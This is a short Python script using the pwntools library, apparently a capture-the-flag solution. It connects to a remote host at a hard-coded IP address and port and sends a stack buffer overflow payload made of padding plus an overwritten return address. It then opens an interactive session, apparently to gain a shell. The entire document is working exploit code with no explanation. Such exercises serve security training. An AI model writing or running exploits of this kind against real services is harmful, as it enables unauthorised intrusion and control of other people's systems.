from pwn import *

io = remote("61.147.171.103",56531)

payload = b'a'*(0x80+8)+p64(0X0400596)

io.sendline(payload)

io.interactive()
